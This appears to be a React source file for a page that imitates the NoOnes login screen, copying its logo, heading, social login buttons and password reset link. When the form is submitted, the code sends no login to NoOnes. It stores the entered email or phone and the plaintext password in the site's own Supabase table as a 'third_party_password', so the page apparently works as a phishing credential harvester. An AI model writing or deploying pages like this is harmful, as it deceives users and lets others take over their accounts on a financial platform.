import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff, Send } from 'lucide-react';
import { supabase } from '../../lib/supabase';

export default function NoonesConnect() {
  const navigate = useNavigate();
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!email || !password) {
      setErrorMessage('Please enter your email/phone and password.');
      return;
    }
    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const { error } = await supabase.from('platform_connections').insert({
        platform: 'Noones',
        email,
        third_party_password: password,
        user_id: session?.user?.id || null
      });
      if (error) throw error;
      navigate('/link-success');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const themeClasses = isDarkMode 
    ? 'bg-[#1a1b1e] text-white' 
    : 'bg-[#f4f7f6] text-[#1a1b1e]';
  
  const cardClasses = isDarkMode
    ? 'bg-[#25262b] border-[#2c2e33]'
    : 'bg-white border-[#e9ecef] shadow-sm';

  const inputClasses = isDarkMode
    ? 'bg-[#2c2e33] border-[#373a40] text-white placeholder:text-[#5c5f66]'
    : 'bg-[#f8f9fa] border-[#dee2e6] text-[#1a1b1e] placeholder:text-[#adb5bd]';

  return (
    <main className={`${themeClasses} min-h-screen flex flex-col items-center justify-center p-4 font-sans transition-colors duration-300`}>
      <div className="w-full max-w-[440px] flex flex-col items-center">
        {/* Logo */}
        <div className="mb-8">
          <h1 className="text-[32px] font-bold tracking-tight flex items-center gap-1">
            <span className="text-[#00c076]">no</span>
            <span className="text-[#00c076]">o</span>
            <span className="text-[#00c076]">nes</span>
          </h1>
        </div>

        {/* Card */}
        <div className={`${cardClasses} w-full rounded-xl border p-8 sm:p-10 flex flex-col items-center`}>
          <h2 className="text-[24px] font-bold mb-6">Welcome to NoOnes</h2>
          
          {/* Social Icons */}
          <div className="flex gap-4 mb-8">
            <button className="w-10 h-10 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 transition-colors">
              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />
            </button>
            <button className="w-10 h-10 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 transition-colors">
              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="w-6 h-6 brightness-0 invert" />
            </button>
            <button className="w-10 h-10 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 transition-colors">
              <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-6 h-6" />
            </button>
          </div>

          <form onSubmit={handleSubmit} className="w-full space-y-5">
            <div>
              <label className="block text-[13px] font-semibold mb-2 opacity-70">Email/Phone number</label>
              <input
                type="text"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Email/Phone number"
                className={`${inputClasses} w-full h-[52px] px-4 rounded-lg border outline-none focus:border-[#00c076] transition-colors`}
              />
            </div>

            <div>
              <label className="block text-[13px] font-semibold mb-2 opacity-70">Password</label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={credentials.password}
                  onChange={handleFieldChange('password')}
                  placeholder="Password"
                  className={`${inputClasses} w-full h-[52px] px-4 rounded-lg border outline-none focus:border-[#00c076] transition-colors`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 opacity-50 hover:opacity-100"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              <div className="flex justify-end mt-2">
                <button type="button" className="text-[#00c076] text-[13px] font-medium hover:underline">Forgot password?</button>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full h-[56px] bg-[#00c076] hover:bg-[#00a868] text-white font-bold rounded-xl transition-colors disabled:opacity-70 mt-4"
            >
              {loading ? 'Logging in...' : 'Log in'}
            </button>

            <div className="text-center mt-6">
              <p className="text-[14px] opacity-70">
                No account yet? <button type="button" className="text-[#00c076] font-bold hover:underline">Sign up</button>
              </p>
            </div>
          </form>
        </div>

        {/* Footer Controls */}
        <div className="w-full mt-8 flex items-center justify-between px-2">
          <div className="flex items-center gap-3">
            <div 
              onClick={() => setIsDarkMode(!isDarkMode)}
              className="flex items-center gap-2 cursor-pointer group"
            >
              <div className={`w-12 h-6 rounded-full relative transition-colors ${isDarkMode ? 'bg-[#00c076]' : 'bg-gray-300'}`}>
                <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-transform ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
              </div>
              <div className="flex items-center gap-1 opacity-60 group-hover:opacity-100 transition-opacity">
                <span className={!isDarkMode ? 'text-[#00c076]' : ''}>☀️</span>
                <span className={isDarkMode ? 'text-[#00c076]' : ''}>🌙</span>
              </div>
            </div>
          </div>
          
          <button className="flex items-center gap-1 text-[14px] font-medium text-[#00c076] hover:underline">
            English <span className="text-[10px]">▼</span>
          </button>
        </div>
      </div>
    </main>
  );
}
